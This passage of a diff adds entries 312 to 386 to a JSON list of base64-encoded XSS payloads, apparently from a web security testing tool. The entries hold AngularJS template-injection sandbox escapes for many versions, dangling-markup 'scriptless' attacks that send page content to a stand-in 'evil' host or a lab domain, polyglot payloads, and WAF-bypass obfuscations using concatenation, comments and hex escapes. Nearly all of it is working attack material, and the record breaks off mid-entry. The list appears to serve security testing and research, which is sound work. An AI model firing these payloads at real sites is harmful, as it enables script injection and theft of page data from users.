+		"script" : "e3sgYz0nJy5zdWIuY2FsbDtiPScnLnN1Yi5iaW5kO2E9Jycuc3ViLmFwcGx5OyBjLiRhcHBseT0kYXBwbHk7Yy4kZXZhbD1iO29wPSRyb290LiQkcGhhc2U7ICRyb290LiQkcGhhc2U9bnVsbDtvZD0kcm9vdC4kZGlnZXN0OyRyb290LiRkaWdlc3Q9KHt9KS50b1N0cmluZzsgQz1jLiRhcHBseShjKTskcm9vdC4kJHBoYXNlPW9wOyRyb290LiRkaWdlc3Q9b2Q7IEI9QyhiLGMsYik7JGV2YWxBc3luYygiIGFzdE5vZGU9cG9wKCk7YXN0Tm9kZS50eXBlPSdVbmFyeUV4cHJlc3Npb24nOyBhc3ROb2RlLm9wZXJhdG9yPScod2luZG93Llg/dm9pZDA6KHdpbmRvdy5YPXRydWUsYWxlcnQoMSkpKSsnOyBhc3ROb2RlLmFyZ3VtZW50PXt0eXBlOidJZGVudGlmaWVyJyxuYW1lOidmb28nfTsgIik7IG0xPUIoJCRhc3luY1F1ZXVlLnBvcCgpLmV4cHJlc3Npb24sbnVsbCwkcm9vdCk7IG0yPUIoQyxudWxsLG0xKTtbXS5wdXNoLmFwcGx5PW0yO2E9Jycuc3ViOyAkZXZhbCgnYShiLmMpJyk7W10ucHVzaC5hcHBseT1hOyB9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 313,
+		"summary" : "Client-side template injection",
+		"description" : "1.5.9 - 1.5.11 shorter, , , ",
+		"script" : "e3tjPScnLnN1Yi5jYWxsO2I9Jycuc3ViLmJpbmQ7Yy4kYXBwbHk9JGFwcGx5O2MuJGV2YWw9Yjskcm9vdC4kJHBoYXNlPW51bGw7JHJvb3QuJGRpZ2VzdD0kb247IEM9Yy4kYXBwbHkoYyk7Qj1DKGIsYyxiKTskZXZhbEFzeW5jKCJhc3ROb2RlPXBvcCgpO2FzdE5vZGUudHlwZT0nVW5hcnlFeHByZXNzaW9uJzthc3ROb2RlLm9wZXJhdG9yPSdhbGVydCgxKSc7YXN0Tm9kZS5hcmd1bWVudD17dHlwZTonSWRlbnRpZmllcid9OyIpO20xPSQkYXN5bmNRdWV1ZS5wb3AoKS5leHByZXNzaW9uO20yPUIoQyxudWxsLG0xKTtbXS5wdXNoLmFwcGx5PW0yOyRldmFsKCdCKGIpJyk7fX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 314,
+		"summary" : "Client-side template injection",
+		"description" : "eliminar filas desde filtro calc, , , ",
+		"script" : "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 315,
+		"summary" : "Client-side template injection",
+		"description" : ">=1.6.0 (shorter), , , ",
+		"script" : "e3skb24uY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 316,
+		"summary" : "Client-side template injection",
+		"description" : "Version:, , , ",
+		"script" : "Y29uc3RydWN0b3IuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 317,
+		"summary" : "Client-side template injection",
+		"description" : "1.0.1 - 1.1.5, , , ",
+		"script" : "Y29uc3RydWN0b3IuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 318,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.0 - 1.2.18, , , ",
+		"script" : "YT0nY29uc3RydWN0b3InO2I9e307YS5zdWIuY2FsbC5jYWxsKGJbYV0uZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKGJbYV0uZ2V0UHJvdG90eXBlT2YoYS5zdWIpLGEpLnZhbHVlLDAsJ2FsZXJ0KDEpJykoKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 319,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.19 - 1.2.23, , , ",
+		"script" : "dG9TdHJpbmcuY29uc3RydWN0b3IucHJvdG90eXBlLnRvU3RyaW5nPXRvU3RyaW5nLmNvbnN0cnVjdG9yLnByb3RvdHlwZS5jYWxsO1siYSIsImFsZXJ0KDEpIl0uc29ydCh0b1N0cmluZy5jb25zdHJ1Y3Rvcik=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 320,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.24 - 1.2.26, , , ",
+		"script" : "e31bWydfX3Byb3RvX18nXV1bJ3gnXT1jb25zdHJ1Y3Rvci5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3I7Zz17fVtbJ19fcHJvdG9fXyddXVsneCddO3t9W1snX19wcm90b19fJ11dWyd5J109ZygnJy5zdWJbWydfX3Byb3RvX18nXV0sJ2NvbnN0cnVjdG9yJyk7e31bWydfX3Byb3RvX18nXV1bJ3onXT1jb25zdHJ1Y3Rvci5kZWZpbmVQcm9wZXJ0eTtkPXt9W1snX19wcm90b19fJ11dWyd6J107ZCgnJy5zdWJbWydfX3Byb3RvX18nXV0sJ2NvbnN0cnVjdG9yJyx7dmFsdWU6ZmFsc2V9KTt7fVtbJ19fcHJvdG9fXyddXVsneSddLnZhbHVlKCdhbGVydCgxKScpKCk=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 321,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.27-1.2.29/1.3.0-1.3.20, , , ",
+		"script" : "e30uIikpKTthbGVydCgxKS8vIjs=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 322,
+		"summary" : "Client-side template injection",
+		"description" : "1.4.0-1.4.5, , , ",
+		"script" : "J2EnLmNvbnN0cnVjdG9yLnByb3RvdHlwZS5jaGFyQXQ9W10uam9pbjtbMV18b3JkZXJCeToneD0xfSB9IH07YWxlcnQoMSkvLyc7",
+		"type" : "XSS"
+	},
+	{
+		"id" : 323,
+		"summary" : "Client-side template injection",
+		"description" : "1.4.2-1.5.8, , , ",
+		"script" : "e3k6JycuY29uc3RydWN0b3IucHJvdG90eXBlfS55LmNoYXJBdD1bXS5qb2luO1sxXXxvcmRlckJ5Oid4PWFsZXJ0KDEpJw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 324,
+		"summary" : "Client-side template injection",
+		"description" : ">=1.6.0, , , ",
+		"script" : "Y29uc3RydWN0b3IuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 325,
+		"summary" : "Client-side template injection",
+		"description" : "1.4.4 (without strings), , , ",
+		"script" : "dG9TdHJpbmcoKS5jb25zdHJ1Y3Rvci5wcm90b3R5cGUuY2hhckF0PVtdLmpvaW47IFsxLDJdfG9yZGVyQnk6dG9TdHJpbmcoKS5jb25zdHJ1Y3Rvci5mcm9tQ2hhckNvZGUoMTIwLDYxLDk3LDEwOCwxMDEsMTE0LDExNiw0MCw0OSw0MSk=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 326,
+		"summary" : "Client-side template injection",
+		"description" : "Version:, , , ",
+		"script" : "PGlucHV0IGF1dG9mb2N1cyBuZy1mb2N1cz0iJGV2ZW50LmNvbXBvc2VkUGF0aCgpfG9yZGVyQnk6J1tdLmNvbnN0cnVjdG9yLmZyb20oWzFdLGFsZXJ0KSciPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 327,
+		"summary" : "Client-side template injection",
+		"description" : "All versions (all browsers) using from, , , ",
+		"script" : "PGlucHV0IGF1dG9mb2N1cyBuZy1mb2N1cz0iJGV2ZW50LmNvbXBvc2VkUGF0aCgpfG9yZGVyQnk6J1tdLmNvbnN0cnVjdG9yLmZyb20oWzFdLGFsZXJ0KSciPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 328,
+		"summary" : "Client-side template injection",
+		"description" : "All versions (all browsers) shorter using assignment, , , ",
+		"script" : "PGlucHV0IGlkPXggbmctZm9jdXM9JGV2ZW50LmNvbXBvc2VkUGF0aCgpfG9yZGVyQnk6Jyh6PWFsZXJ0KSgxKSc+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 329,
+		"summary" : "Client-side template injection",
+		"description" : "All versions (all browsers) shorter, , , ",
+		"script" : "PGlucHV0IGF1dG9mb2N1cyBuZy1mb2N1cz0iJGV2ZW50LmNvbXBvc2VkUGF0aCgpfG9yZGVyQnk6J1tdLmNvbnN0cnVjdG9yLmZyb20oWzFdLGFsZXJ0KSciPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 330,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.0 - 1.5.0, , , ",
+		"script" : "PGRpdiBuZy1hcHAgbmctY3NwPjxkaXYgbmctZm9jdXM9Ing9JGV2ZW50OyIgaWQ9ZiB0YWJpbmRleD0wPmZvbzwvZGl2PjxkaXYgbmctcmVwZWF0PSIoa2V5LCB2YWx1ZSkgaW4geC52aWV3Ij48ZGl2IG5nLWlmPSJrZXkgPT0gJ3dpbmRvdyciPnt7IFsxXS5yZWR1Y2UodmFsdWUuYWxlcnQsIDEpOyB9fTwvZGl2PjwvZGl2PjwvZGl2Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 331,
+		"summary" : "Client-side template injection",
+		"description" : "All versions (all browsers) shorter via oncut, , , ",
+		"script" : "PGlucHV0IG5nLWN1dD0kZXZlbnQuY29tcG9zZWRQYXRoKCl8b3JkZXJCeTonKHk9YWxlcnQpKDEpJz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 332,
+		"summary" : "Scriptless attacks",
+		"description" : "Background attribute, , , ",
+		"script" : "PGJvZHkgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGUgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGU+PHRoZWFkIGJhY2tncm91bmQ9Ii8vZXZpbD8gPHRhYmxlPjx0Ym9keSBiYWNrZ3JvdW5kPSIvL2V2aWw/IDx0YWJsZT48dGZvb3QgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGU+PHRkIGJhY2tncm91bmQ9Ii8vZXZpbD8gPHRhYmxlPjx0aCBiYWNrZ3JvdW5kPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 333,
+		"summary" : "Scriptless attacks",
+		"description" : "Background attribute, , , ",
+		"script" : "PGJvZHkgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGUgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGU+PHRoZWFkIGJhY2tncm91bmQ9Ii8vZXZpbD8gPHRhYmxlPjx0Ym9keSBiYWNrZ3JvdW5kPSIvL2V2aWw/IDx0YWJsZT48dGZvb3QgYmFja2dyb3VuZD0iLy9ldmlsPyA8dGFibGU+PHRkIGJhY2tncm91bmQ9Ii8vZXZpbD8gPHRhYmxlPjx0aCBiYWNrZ3JvdW5kPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 334,
+		"summary" : "Scriptless attacks",
+		"description" : "Link href stylesheet, , , ",
+		"script" : "PGxpbmsgcmVsPXN0eWxlc2hlZXQgaHJlZj0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 335,
+		"summary" : "Scriptless attacks",
+		"description" : "Link href icon, , , ",
+		"script" : "PGxpbmsgcmVsPWljb24gaHJlZj0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 336,
+		"summary" : "Scriptless attacks",
+		"description" : "Meta refresh, , , ",
+		"script" : "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDsgaHR0cDovL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 337,
+		"summary" : "Scriptless attacks",
+		"description" : "Img to pass markup through src attribute, , , ",
+		"script" : "PGltZyBzcmM9Ii8vZXZpbD8gPGltYWdlIHNyYz0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 338,
+		"summary" : "Scriptless attacks",
+		"description" : "Video using track element, , , ",
+		"script" : "PHZpZGVvPjx0cmFjayBkZWZhdWx0IHNyYz0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 339,
+		"summary" : "Scriptless attacks",
+		"description" : "Video using source element and src attribute, , , ",
+		"script" : "PHZpZGVvPjxzb3VyY2Ugc3JjPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 340,
+		"summary" : "Scriptless attacks",
+		"description" : "Audio using source element and src attribute, , , ",
+		"script" : "PGF1ZGlvPjxzb3VyY2Ugc3JjPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 341,
+		"summary" : "Scriptless attacks",
+		"description" : "Input src, , , ",
+		"script" : "PGlucHV0IHR5cGU9aW1hZ2Ugc3JjPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 342,
+		"summary" : "Scriptless attacks",
+		"description" : "Button using formaction, , , ",
+		"script" : "PGZvcm0+PGJ1dHRvbiBzdHlsZT0id2lkdGg6MTAwJTtoZWlnaHQ6MTAwJSIgdHlwZT1zdWJtaXQgZm9ybWFjdGlvbj0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 343,
+		"summary" : "Scriptless attacks",
+		"description" : "Input using formaction, , , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJYU1MiIHN0eWxlPSJ3aWR0aDoxMDAlO2hlaWdodDoxMDAlIiB0eXBlPXN1Ym1pdCBmb3JtYWN0aW9uPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 344,
+		"summary" : "Scriptless attacks",
+		"description" : "Form using action, , , ",
+		"script" : "PGJ1dHRvbiBmb3JtPXggc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7Ij48Zm9ybSBpZD14IGFjdGlvbj0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 345,
+		"summary" : "Scriptless attacks",
+		"description" : "Object data, , , ",
+		"script" : "PG9iamVjdCBkYXRhPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 346,
+		"summary" : "Scriptless attacks",
+		"description" : "Iframe src, , , ",
+		"script" : "PGlmcmFtZSBzcmM9Ii8vZXZpbD8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 347,
+		"summary" : "Scriptless attacks",
+		"description" : "Embed src, , , ",
+		"script" : "PGVtYmVkIHNyYz0iLy9ldmlsPw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 348,
+		"summary" : "Scriptless attacks",
+		"description" : "Use textarea to consume markup and post to external site, , , ",
+		"script" : "PGZvcm0+PGJ1dHRvbiBmb3JtYWN0aW9uPS8vZXZpbD5YU1M8L2J1dHRvbj48dGV4dGFyZWEgbmFtZT14Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 349,
+		"summary" : "Scriptless attacks",
+		"description" : "Pass markup data through window.name using form target, , , ",
+		"script" : "PGJ1dHRvbiBmb3JtPXg+WFNTPC9idXR0b24+PGZvcm0gaWQ9eCBhY3Rpb249Ly9ldmlsIHRhcmdldD0n",
+		"type" : "XSS"
+	},
+	{
+		"id" : 350,
+		"summary" : "Scriptless attacks",
+		"description" : "Pass markup data through window.name using base target, , , ",
+		"script" : "PGEgaHJlZj1odHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC9kYW5nbGluZ19tYXJrdXAvbmFtZS5odG1sPjxmb250IHNpemU9MTAwIGNvbG9yPXJlZD5Zb3UgbXVzdCBjbGljayBtZTwvZm9udD48L2E+PGJhc2UgdGFyZ2V0PSI=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 351,
+		"summary" : "Scriptless attacks",
+		"description" : "Pass markup data through window.name using formtarget, , , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJDbGljayBtZSIgZm9ybWFjdGlvbj1odHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC9kYW5nbGluZ19tYXJrdXAvbmFtZS5odG1sIGZvcm10YXJnZXQ9Ig==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 352,
+		"summary" : "Scriptless attacks",
+		"description" : "Using base href to pass data, , , ",
+		"script" : "PGEgaHJlZj1hYmMgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7cG9zaXRpb246YWJzb2x1dGU7Zm9udC1zaXplOjEwMDBweDsiPnhzczxiYXNlIGhyZWY9Ii8vZXZpbC8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 353,
+		"summary" : "Scriptless attacks",
+		"description" : "Using embed window name to pass data from the page, , , ",
+		"script" : "PGVtYmVkIHNyYz1odHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC9kYW5nbGluZ19tYXJrdXAvbmFtZS5odG1sIG5hbWU9Ig==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 354,
+		"summary" : "Scriptless attacks",
+		"description" : "Using iframe window name to pass data from the page, , , ",
+		"script" : "PGlmcmFtZSBzcmM9aHR0cDovL3N1YmRvbWFpbjEucG9ydHN3aWdnZXItbGFicy5uZXQvZGFuZ2xpbmdfbWFya3VwL25hbWUuaHRtbCBuYW1lPSI=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 355,
+		"summary" : "Scriptless attacks",
+		"description" : "Using object window name to pass data from the page, , , ",
+		"script" : "PG9iamVjdCBkYXRhPWh0dHA6Ly9zdWJkb21haW4xLnBvcnRzd2lnZ2VyLWxhYnMubmV0L2RhbmdsaW5nX21hcmt1cC9uYW1lLmh0bWwgbmFtZT0i",
+		"type" : "XSS"
+	},
+	{
+		"id" : 356,
+		"summary" : "Scriptless attacks",
+		"description" : "Using frame window name to pass data from the page, , , ",
+		"script" : "PGZyYW1lc2V0PjxmcmFtZSBzcmM9aHR0cDovL3N1YmRvbWFpbjEucG9ydHN3aWdnZXItbGFicy5uZXQvZGFuZ2xpbmdfbWFya3VwL25hbWUuaHRtbCBuYW1lPSI=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 357,
+		"summary" : "Scriptless attacks",
+		"description" : "Overwrite type attribute with image in hidden inputs, , , ",
+		"script" : "PGlucHV0IHR5cGU9aGlkZGVuIHR5cGU9aW1hZ2Ugc3JjPSIvL2V2aWw/",
+		"type" : "XSS"
+	},
+	{
+		"id" : 358,
+		"summary" : "Polyglots",
+		"description" : "Polyglot payload 1, , , ",
+		"script" : "amF2YXNjcmlwdDovKi0tPjwvdGl0bGU+PC9zdHlsZT48L3RleHRhcmVhPjwvc2NyaXB0PjwveG1wPjxzdmcvb25sb2FkPScrLyIvKy9vbm1vdXNlb3Zlcj0xLysvWyovW10vK2FsZXJ0KDEpLy8nPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 359,
+		"summary" : "Polyglots",
+		"description" : "Polyglot payload 2, , , ",
+		"script" : "amF2YXNjcmlwdDoiLyonLypgLyotLT48L25vc2NyaXB0PjwvdGl0bGU+PC90ZXh0YXJlYT48L3N0eWxlPjwvdGVtcGxhdGU+PC9ub2VtYmVkPjwvc2NyaXB0PjxodG1sIFwiIG9ubW91c2VvdmVyPS8qJmx0O3N2Zy8qL29ubG9hZD1hbGVydCgpLy8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 360,
+		"summary" : "Polyglots",
+		"description" : "Polyglot payload 3, , , ",
+		"script" : "amF2YXNjcmlwdDovKi0tPjwvdGl0bGU+PC9zdHlsZT48L3RleHRhcmVhPjwvc2NyaXB0PjwveG1wPjxkZXRhaWxzL29wZW4vb250b2dnbGU9JysvYC8rLyIvKy9vbm1vdXNlb3Zlcj0xLysvWyovW10vK2FsZXJ0KC9AUG9ydFN3aWdnZXJSZXMvKS8vJz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 361,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (window), , , ",
+		"script" : "Jzt3aW5kb3dbJ2FsZScrJ3J0J10od2luZG93Wydkb2MnKyd1bWVudCddWydkb20nKydhaW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 362,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (self), , , ",
+		"script" : "JztzZWxmWydhbGUnKydydCddKHNlbGZbJ2RvYycrJ3VtZW50J11bJ2RvbScrJ2FpbiddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 363,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (this), , , ",
+		"script" : "Jzt0aGlzWydhbGUnKydydCddKHRoaXNbJ2RvYycrJ3VtZW50J11bJ2RvbScrJ2FpbiddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 364,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (top), , , ",
+		"script" : "Jzt0b3BbJ2FsZScrJ3J0J10odG9wWydkb2MnKyd1bWVudCddWydkb20nKydhaW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 365,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (parent), , , ",
+		"script" : "JztwYXJlbnRbJ2FsZScrJ3J0J10ocGFyZW50Wydkb2MnKyd1bWVudCddWydkb20nKydhaW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 366,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (frames), , , ",
+		"script" : "JztmcmFtZXNbJ2FsZScrJ3J0J10oZnJhbWVzWydkb2MnKyd1bWVudCddWydkb20nKydhaW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 367,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: string concatenation (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWydhbGUnKydydCddKGdsb2JhbFRoaXNbJ2RvYycrJ3VtZW50J11bJ2RvbScrJ2FpbiddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 368,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (window), , , ",
+		"script" : "Jzt3aW5kb3dbLypmb28qLydhbGVydCcvKmJhciovXSh3aW5kb3dbLypmb28qLydkb2N1bWVudCcvKmJhciovXVsnZG9tYWluJ10pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 369,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (self), , , ",
+		"script" : "JztzZWxmWy8qZm9vKi8nYWxlcnQnLypiYXIqL10oc2VsZlsvKmZvbyovJ2RvY3VtZW50Jy8qYmFyKi9dWydkb21haW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 370,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (this), , , ",
+		"script" : "Jzt0aGlzWy8qZm9vKi8nYWxlcnQnLypiYXIqL10odGhpc1svKmZvbyovJ2RvY3VtZW50Jy8qYmFyKi9dWydkb21haW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 371,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (top), , , ",
+		"script" : "Jzt0b3BbLypmb28qLydhbGVydCcvKmJhciovXSh0b3BbLypmb28qLydkb2N1bWVudCcvKmJhciovXVsnZG9tYWluJ10pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 372,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (parent), , , ",
+		"script" : "JztwYXJlbnRbLypmb28qLydhbGVydCcvKmJhciovXShwYXJlbnRbLypmb28qLydkb2N1bWVudCcvKmJhciovXVsnZG9tYWluJ10pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 373,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (frames), , , ",
+		"script" : "JztmcmFtZXNbLypmb28qLydhbGVydCcvKmJhciovXShmcmFtZXNbLypmb28qLydkb2N1bWVudCcvKmJhciovXVsnZG9tYWluJ10pOy8v",
+		"type" : "XSS"
+	},
+	{
+		"id" : 374,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: comment syntax (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWy8qZm9vKi8nYWxlcnQnLypiYXIqL10oZ2xvYmFsVGhpc1svKmZvbyovJ2RvY3VtZW50Jy8qYmFyKi9dWydkb21haW4nXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 375,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (window), , , ",
+		"script" : "Jzt3aW5kb3dbJ1x4NjFceDZjXHg2NVx4NzJceDc0J10od2luZG93WydceDY0XHg2Zlx4NjNceDc1XHg2ZFx4NjVceDZlXHg3NCddWydceDY0XHg2Zlx4NmRceDYxXHg2OVx4NmUnXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 376,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (self), , , ",
+		"script" : "JztzZWxmWydceDYxXHg2Y1x4NjVceDcyXHg3NCddKHNlbGZbJ1x4NjRceDZmXHg2M1x4NzVceDZkXHg2NVx4NmVceDc0J11bJ1x4NjRceDZmXHg2ZFx4NjFceDY5XHg2ZSddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 377,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (this), , , ",
+		"script" : "Jzt0aGlzWydceDYxXHg2Y1x4NjVceDcyXHg3NCddKHRoaXNbJ1x4NjRceDZmXHg2M1x4NzVceDZkXHg2NVx4NmVceDc0J11bJ1x4NjRceDZmXHg2ZFx4NjFceDY5XHg2ZSddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 378,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (top), , , ",
+		"script" : "Jzt0b3BbJ1x4NjFceDZjXHg2NVx4NzJceDc0J10odG9wWydceDY0XHg2Zlx4NjNceDc1XHg2ZFx4NjVceDZlXHg3NCddWydceDY0XHg2Zlx4NmRceDYxXHg2OVx4NmUnXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 379,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (parent), , , ",
+		"script" : "JztwYXJlbnRbJ1x4NjFceDZjXHg2NVx4NzJceDc0J10ocGFyZW50WydceDY0XHg2Zlx4NjNceDc1XHg2ZFx4NjVceDZlXHg3NCddWydceDY0XHg2Zlx4NmRceDYxXHg2OVx4NmUnXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 380,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (frames), , , ",
+		"script" : "JztmcmFtZXNbJ1x4NjFceDZjXHg2NVx4NzJceDc0J10oZnJhbWVzWydceDY0XHg2Zlx4NjNceDc1XHg2ZFx4NjVceDZlXHg3NCddWydceDY0XHg2Zlx4NmRceDYxXHg2OVx4NmUnXSk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 381,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence (globalThis), , , ",
+		"script" : "JztnbG9iYWxUaGlzWydceDYxXHg2Y1x4NjVceDcyXHg3NCddKGdsb2JhbFRoaXNbJ1x4NjRceDZmXHg2M1x4NzVceDZkXHg2NVx4NmVceDc0J11bJ1x4NjRceDZmXHg2ZFx4NjFceDY5XHg2ZSddKTsvLw==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 382,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (window), , , ",
+		"script" : "Jzt3aW5kb3dbJ1x4NjVceDc2XHg2MVx4NmMnXSgnd2luZG93WyJceDYxXHg2Y1x4NjVceDcyXHg3NCJdKHdpbmRvd1siXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 383,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (self), , , ",
+		"script" : "JztzZWxmWydceDY1XHg3Nlx4NjFceDZjJ10oJ3NlbGZbIlx4NjFceDZjXHg2NVx4NzJceDc0Il0oc2VsZlsiXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 384,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (this), , , ",
+		"script" : "Jzt0aGlzWydceDY1XHg3Nlx4NjFceDZjJ10oJ3RoaXNbIlx4NjFceDZjXHg2NVx4NzJceDc0Il0odGhpc1siXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 385,
+		"summary" : "WAF bypass global objects",
+		"description" : "XSS into a JavaScript string: hex escape sequence and base64 encoded string (top), , , ",
+		"script" : "Jzt0b3BbJ1x4NjVceDc2XHg2MVx4NmMnXSgndG9wWyJceDYxXHg2Y1x4NjVceDcyXHg3NCJdKHRvcFsiXHg2MVx4NzRceDZmXHg2MiJdKCJXRk5UIikpJyk7Ly8=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 386,
